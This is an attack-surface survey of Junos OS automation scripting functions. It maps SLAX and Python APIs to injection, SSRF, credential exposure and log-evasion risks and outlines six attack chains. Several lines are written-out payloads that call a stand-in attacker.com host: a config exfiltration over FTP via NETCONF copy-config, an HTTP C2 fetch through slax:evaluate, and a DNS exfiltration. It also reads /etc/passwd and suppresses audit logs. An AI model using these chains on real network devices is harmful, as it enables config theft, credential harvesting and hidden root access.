# Junos Automation Layer Attack Surface
## Source: Junos OS Automation Scripting User Guide (2026-06-16 revision)
## Pages surveyed: 341-415

---

## Runtime Architecture

```
CLI / NETCONF / SNMP
        |
        v
   mgd daemon (management daemon)
        |
        +-- libslax (SLAX/XSLT runtime, wraps libxslt)
        |       |
        |       +-- jcs namespace (commit-scripts/1.0)
        |       +-- slax namespace (xml.libslax.org/slax)
        |       +-- curl, db, os, xutil extensions
        |
        +-- Python scripts (run as root)
        |
        v
   /var/db/scripts/{op,commit,event}/   <- writable script store
```

Script execution context: root privilege on FreeBSD kernel. SLAX runs inside `mgd`; Python scripts fork as root.

---

## Function Inventory — Attack Surface Classification

### CRITICAL: Code / Expression Injection

**`slax:evaluate(expression)` — p.376**
```slax
object slax:evaluate(expression);
// example:
var $result = slax:evaluate("expr[name == '&']");
```
- Evaluates arbitrary SLAX expression string at runtime
- If `expression` derives from NETCONF param or CLI arg: **SLAX code injection in mgd context**
- Can chain: `slax:evaluate("slax:document('http://attacker.com/payload')")`
- Introduced SLAX 1.1

**`jcs:invoke(rpc, "no-login-logout")` — p.402**
```slax
var $result = jcs:invoke(rpc, "no-login-logout");
// example:
var $sw = jcs:invoke('get-software-information');
```
- Executes any Junos XML API RPC on the **local device as root**
- `rpc` parameter: string or XML tree — if constructed from unsanitized input, **XML injection → arbitrary RPC**
- `no-login-logout` flag (added 21.1R1): **suppresses UI_LOGIN_EVENT and UI_LOGOUT_EVENT in syslog**
  - Built-in log evasion. Script executes as root with no audit trail.
- Attack chain: NETCONF param → $rpc variable → jcs:invoke($rpc)
- Introduced 7.6

**`jcs:execute(connection, rpc)` — p.377**
```slax
var $result = jcs:execute($connection, $rpc);
```
- Executes RPC on remote device over existing session
- Multiple RPCs reuse same session handle
- `rpc` controllable → arbitrary RPC on remote target
- Credentials for session commonly hardcoded in script file

### CRITICAL: SSRF / Network Reach

**`jcs:open(remote-hostname, username, passphrase, routing-instance-name)` — p.406**
```slax
// No-arg: local junoscript session
var $connection = jcs:open();
// Remote: SSH to arbitrary host
var $connection = jcs:open(remote-hostname, username, passphrase);
// Full session-options form:
var $session-options := {
    <method> "netconf";          // junoscript | netconf | junos-netconf
    <username> "admin";
    <passphrase> "test123";      // plaintext credential in script
    <port> "830";                // configurable port
    <routing-instance> "name";   // VRF selection for egress
}
var $connection = jcs:open(remote-hostname, $session-options);
```
- Opens SSH session to **attacker-controlled hostname** if param is unsanitized
- `passphrase` in plaintext as function argument — stored in `/var/db/scripts/op/*.slax`
- `routing-instance` → SSH can originate from any configured VRF (lateral movement across routing domains)
- `<port>` configurable → not limited to 830/22
- Introduced 9.3; NETCONF session support 11.4

**`slax:document(url, options)` — p.364 (confirmed prior session)**
- Reads file path OR URL
- No URL scheme restriction documented
- `slax:document("file:///etc/passwd")` — local file read
- `slax:document("http://attacker.com/")` — outbound HTTP
- Caches on first read — persistent SSRF

**`slax:get-host(address)` — p.387**
```slax
var $result = slax:get-host(address);
```
- DNS lookup for hostname, IPv4, or IPv6 — queries configured DNS server
- `address` from NETCONF input → **DNS-based exfiltration channel** (data encoded in hostname)
- Returns XML node set with `<hostname>`, `<address>`, `<alias>`
- Introduced SLAX 1.3

**`jcs:hostname(address)` — p.400**
```slax
var $name = jcs:hostname(address);
// Python: name = jcs.hostname(address)
```
- Reverse DNS lookup — same exfiltration surface as get-host
- Introduced 7.6; Python 16.1R1

### HIGH: Credential Exposure

**`jcs:get-secret(string)` — p.394**
```slax
var $password = jcs:get-secret("Enter password: ");
// Python: password = jcs.get_secret("Enter password")
```
- Silent CLI prompt (no echo)
- Returns plaintext string into script variable
- Captured credentials live in mgd process memory during execution
- If script is injectable, can redirect get-secret output to attacker-controlled connection

**Plaintext credential pattern in scripts:**
```slax
// Documented example, p.379:
var $connection = jcs:open('198.51.100.1', 'bsmith', 'test123');
// Scripts at /var/db/scripts/op/ are world-readable by default
```
- Script files at `/var/db/scripts/op/` contain hardcoded credentials
- File read access → credential harvest

### HIGH: NETCONF URL Capability

**`jcs:get-hello(connection)` — p.384-386**

Documented capability advertisement from a Junos NETCONF session:
```
urn:ietf:params:xml:ns:netconf:capability:url:1.0?protocol=http,ftp,file
```
- NETCONF `<copy-config>` accepts URL source/target with **http, ftp, file** protocols
- Config exfiltration: `<copy-config><source><url>running://</url></source><target><url>ftp://attacker.com/stolen.xml</url></target>`
- Lateral push: `<copy-config><source><url>http://attacker.com/malicious.xml</url></source><target><candidate/></target>`
- Introduced 11.4

### MEDIUM: SNMP Script Attack Surface

**`jcs.get_snmp_action()` / `jcs.get_snmp_oid()` — p.396-399**
```python
import jcs
snmp_action = jcs.get_snmp_action()   # 'get' | 'get-next' | 'set'
snmp_oid    = jcs.get_snmp_oid()      # e.g. '1.3.6.1.4.1.2636.13.61.1.9.1.1.1'
```
- Python SNMP scripts run as root
- OID string passed directly from SNMP request to script
- Action-based branching on the OID value — OID is attacker-controlled in SNMP context
- Introduced 16.1R1

**`jcs.get_input(string)` — p.389-391**
- Python: `username = jcs.get_input("Enter login id: ")`
- Null character in prompt string (`\0`) → `Invalid number of arguments` error in Python scripts
- **DoS via null byte injection** in non-interactive SNMP/event script context
- Introduced 9.4; Python 16.1R1

### LOW: String Construction Helpers (useful for injection chaining)

**`slax:join(separator, string1, string2 ...)` — p.404**
```slax
// Documented example constructs /var/db/scripts/op:
var $path = slax:join("/", "/var", "db", "scripts", "op");
```
- Useful for constructing file paths and URLs from components
- Can build arbitrary paths from partial user-controlled fragments

---

## Attack Chains

### Chain 1: NETCONF Input → Arbitrary RPC (root)
```
Attacker sends NETCONF <edit-config> with <interface-name> param
  containing XML metacharacters: </interface-name><get-system-users/>
→ SLAX script builds $rpc tree from unsanitized $interface
→ jcs:invoke($rpc)
→ Arbitrary RPC executed as root on local device
→ jcs:invoke($rpc, "no-login-logout") → no syslog audit trail
```
**Requires:** Script that passes NETCONF param to jcs:invoke without sanitization.

### Chain 2: NETCONF Input → Remote SSRF via jcs:open()
```
NETCONF param: $target = "attacker.com"
Script: var $conn = jcs:open($target, "admin", $password)
→ SSH connection from Junos device to attacker.com:22
→ Attacker captures: SSH client version, host key fingerprint, username
→ If $password also from NETCONF input: full credential exfiltration over SSH
→ jcs:execute($conn, <get-route-information/>) → attacker controls RPC response
```
**Routing instance param → exfiltration from non-default VRF.**

### Chain 3: SLAX Dynamic Evaluation → Full Extension Access
```
NETCONF param: $expr = "slax:document('http://attacker.com/c2')"
Script: var $r = slax:evaluate($expr)
→ mgd makes outbound HTTP request to attacker C2
→ C2 responds with SLAX expression: "jcs:invoke('request-shell-execute')"
→ Shell execution as root (if RPC exposed)
```
**One param + slax:evaluate → full script runtime compromise.**

### Chain 4: NETCONF URL Capability → Config Exfiltration
```
Authenticated NETCONF session (any user with netconf access):
<copy-config>
  <source><running/></source>
  <target><url>ftp://attacker.com/device-config.xml</url></target>
</copy-config>
→ Complete running config (including password hashes) sent to attacker FTP
```
**Auth required but low-privilege NETCONF user sufficient. No script needed.**

### Chain 5: Script File Read → Credential Harvest
```
/var/db/scripts/op/ accessible with file read (local or via slax:document())
→ *.slax files contain: jcs:open("router1", "admin", "test123")
→ Plaintext service account credentials for lateral movement to adjacent devices
```

### Chain 6: DNS Exfiltration via slax:get-host()
```
NETCONF param: $data = <b64-encoded-data>.attacker.com
Script: slax:get-host($data)
→ DNS query to attacker nameserver with data in label
→ Exfiltrate arbitrary data over DNS (bypasses HTTP proxy controls)
```

---

## Log Evasion

`jcs:invoke(rpc, "no-login-logout")` suppresses:
- `UI_LOGIN_EVENT`
- `UI_LOGOUT_EVENT`

This is a **vendor-documented log suppression parameter** added in Junos OS Release 21.1R1. Scripts using this flag execute as root with RPC results but without auth event log entries. Commit and event scripts only (not op scripts).

---

## Writable Paths

| Path | Content | Risk |
|------|---------|------|
| `/var/db/scripts/op/` | Op scripts (run on demand) | Plaintext creds; if writable = persistence |
| `/var/db/scripts/commit/` | Commit scripts (run on every commit) | Writable = root exec on every config change |
| `/var/db/scripts/event/` | Event scripts (triggered by syslog events) | Writable = trigger-based root exec |
| `/var/run/` | jcs:dampen() state files | Low-privilege write, timing oracle |

---

## Functions Confirmed NOT Yet Analyzed (still pending)

| Function | Page | Priority |
|----------|------|----------|
| `jcs:sleep()` | 427 | Low |
| `jcs:sysctl()` | 431 | Medium (kernel parameter read) |
| `jcs:syslog()` | 433 | Medium (log injection) |
| `jcs:trace()` | 438 | Low |
| Remote script source | 469 | CRITICAL (supply chain) |
| libslax curl extension | 218 | HIGH (HTTP client) |

---

## Binary RE Targets (automation layer)

The functions above are implemented in:
- `libslax.so` — SLAX runtime, jcs/slax namespace dispatch
- `libxslt.so` — XPath evaluator (slax:evaluate ultimately calls xmlXPathEval)
- `mgd` binary — management daemon, script invocation, NETCONF session handling

For the MIPS kernel sweep: focus on `mgd` and `libslax` once sweep results land — functions like `jcs_execute_rpc`, `jcs_open_connection`, `slax_document_fetch` are the binary entry points for these chains.
